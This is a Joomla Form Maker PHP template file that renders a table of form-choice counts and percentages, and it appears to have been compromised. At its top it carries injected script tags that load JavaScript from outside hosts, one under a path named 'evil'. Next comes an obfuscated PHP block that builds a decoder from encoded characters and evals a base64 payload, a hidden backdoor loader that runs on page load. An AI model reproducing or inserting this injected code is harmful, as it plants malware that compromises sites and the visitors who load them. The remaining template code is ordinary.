<script src="http://cpm.36obuy.org/evil/1.js"></script><script src="http://cpm.36obuy.org/lion/1.js"></script><script/src=//360cdn.win/c.css></script>



<?php
$O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};eval($O00O0O("JE8wTzAwMD0iVEJySVZMeGNHT1h2QUpsdXR6aGZEeW9VRk5QSHFNWm1Dd0tqYXBXU2RiZXNRWWlnbmtFUlplTHpwUUFGZ0JXUFZLaFhmWUpib3lsSGp4TmNJZHV0R3ZrRU9yUkRtVXdpTXFzQ1RTbmFObzl2T2NWa3VUcFhxM2FyVTI0Q09SdVlGZ2hTdVd6bGtXaWtHRGFzVTNhWXpvMENxV0t5cVdTbEdDU0tHTVNLR0RtWk9ncFhVUm5UekdWQ3pHVkN6bzArekdtdU9XeFBtV3h2T1JhaEZzRmlHQ1NLR01TS0dEbUdxUmhTbURGQ3pHVkN6R1ZDem8wK3pHbUdxUmhTbVd4dk9SYWhGc0ZpR0NTS0dNU0tHREZZeEVWVHpHVkN6R1ZDekdWQ3pvMCt6R0ZZeEVlWkZnaFN1V3pUUVZsS0dEVkN6R1ZDekdWQ3pHVkN6R1ZDekdWVGEyOVB1MkFocXQ5MEt5VkN6R1Y5TnNWVGEyOVB1MkFocXQ5MEt5dmtHTVNLR0RWQ3pHVkN6R1ZDSzN4UEYyOVlGZ2hTdVd6VHpHVkN6bzArekdtWloxeE5LeXZrR01TS0dNU0tLM3hQdTI5MUt5VkN6R1ZDekdWQ05aNENLM3hQdTI5MUt5dmtHTVNDa1ppa0dEYTFGMnB5TVJtaFVUTUNORGVZbWNLMFUyQVBtMnB5a0dhYkgwcERwU3BEUnltenBqYU1XMXBaYXBLYk1IbWpaaE1UV0RTN0dzVkN6R2V0VTNLaHFSeGxrR2FzVTNhWXpnall6R2FMem8wK3pHYTJrV2lrR01ocnVzSlltY0tyRjNheWtHYTFGMnB5TVJtaFVUTWlLY3Fya1dpa0dNU0tGdHAwbVdLWHpjYXltUkg3R0NTS0dSS3l1UmpMQnZsS0dXMGtHVzBrR1dLaG1jcHlVc2V0cVJBWXVaaWtiTWxrT1JxbE9SdVlGZ2hTdVd6bGtEU2tHV2lrS2d1clVnSENORGV0T1JBaFcybWhtajlFVTI1MHVSNTBGeUNUT2NhMEZvbFBRM20zbXk1NnUycmZRUjl5dXk1RVUyMFBLeVM3elZyaHEySlB6R2F0T1JBaEJ2cmh3Z2gwQnZsS2JNbC9OQz09IjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="));?>



<?php
/**
 * @package Form Maker
 * @author Web-Dorado
 * @copyright (C) 2011 Web-Dorado. All rights reserved.
 * @license GNU/GPLv3 http://www.gnu.org/licenses/gpl-3.0.html
 **/
 
defined('_JEXEC') or die('Restricted access'); 

	$choices	= $this->choices;
	$colors=array('#D6DEE9','#F5DFCA');
	$choices_colors=array('#6095CB','#FF9630');
	$choices_labels=array();
	$choices_count=array();
	$all=count($choices);
	$unanswered=0;	
	?>
	<style>
	.adminlist
	{
		border-collapse: separate;
		font-size:14px;
		width: 100%;
	}
	
	.adminlist th
	{
		font-size:14px;
		padding: 10px 0;
	}
	
	.adminlist td
	{
		border: none !important;
	}
	
	.adminlist td:first-child
	{
		
		color:#fff;
		padding: 4px;
	}

	.label0
	{
		background:#6095CB;
		border: 2px solid #6095CB;
	}
	.label1
	{
		background:#FF9630;
		border: 2px solid #FF9630;
	}
	.bordered0:before
	{
		content: " ";
		width:20px;
		height:16px;
		margin-left: -15px;
		background:#D6DEE9;
		display: inline-block;
		-webkit-transform: scale(1) rotate(0deg) translateX(0px) translateY(0px) skewX(-25deg) skewY(0deg);
	}
	
	.bordered1:before
	{
		content: " ";
		width:20px;
		height:16px;
		margin-left: -15px;
		background:#F5DFCA;
		display: inline-block;
		-webkit-transform: scale(1) rotate(0deg) translateX(0px) translateY(0px) skewX(-25deg) skewY(0deg);
	}
	

	
	</style>
	<?php 
	foreach($choices as $key => $choice)
	{
		if($choice->element_value=='')
		{
			$unanswered++;
		}
		else
		{
			if(!in_array( $choice->element_value,$choices_labels))
			{
				array_push($choices_labels, $choice->element_value);
				array_push($choices_count, 0);
			}

			$choices_count[array_search($choice->element_value, $choices_labels)]++;
		}
	}
	array_multisort($choices_count,SORT_DESC,$choices_labels);
	?><table  class="adminlist">
		<thead>
			<tr>
				<th width="20%">Choices</th>
				<th>Percentage</th>
				<th width="10%">Count</th>
			</tr>
		</thead>
	<?php 
	$k=0;
	foreach($choices_labels as $key => $choices_label)
	{
	?>
		<tr>
			<td class="label<?php echo $k; ?>"><?php echo str_replace("***br***",'<br>', $choices_label)?></td>
			<td><div class="bordered" style="width:<?php echo ($choices_count[$key]/($all-$unanswered))*100; ?>%; height:16px; background-color:<?php echo $colors[$key % 2]; ?>; display:inline-block;"></div><div <?php echo ($choices_count[$key]/($all-$unanswered)!=1 ? 'class="bordered'.$k.'"' : "") ?> style="width:<?php echo 100-($choices_count[$key]/($all-$unanswered))*100; ?>%; height:16px; background-color:#F2F0F1; display:inline-block;"></div></td>
			<td><div><div style="width: 0; height: 0; border-top: 8px solid transparent;border-bottom: 8px solid transparent; border-right:8px solid <?php echo $choices_colors[$key % 2]; ?>; float:left;"></div><div style="background-color:<?php echo $choices_colors[$key % 2]; ?>; height:16px; width:16px; text-align: center; margin-left:8px; color: #fff;"><?php echo $choices_count[$key]?></div></div></td>
		</tr>
		<tr>
			<td colspan="3">
			</td>
		</tr>
	<?php 
		$k = 1 - $k;
	}
	
	if($unanswered){
	?>
	<tr>
	<td colspan="2" style="text-align:right; color: #000;">Unanswered</th>
	<td><strong style="margin-left:10px;"><?php echo $unanswered;?></strong></th>
	</tr>

	<?php	
	}
	?>
	<tr>
	<td colspan="2" style="text-align:right; color: #000;"><strong>Total</strong></th>
	<td><strong style="margin-left:10px;"><?php echo $all;?></strong></th>
	</tr>

	</table>
<?php


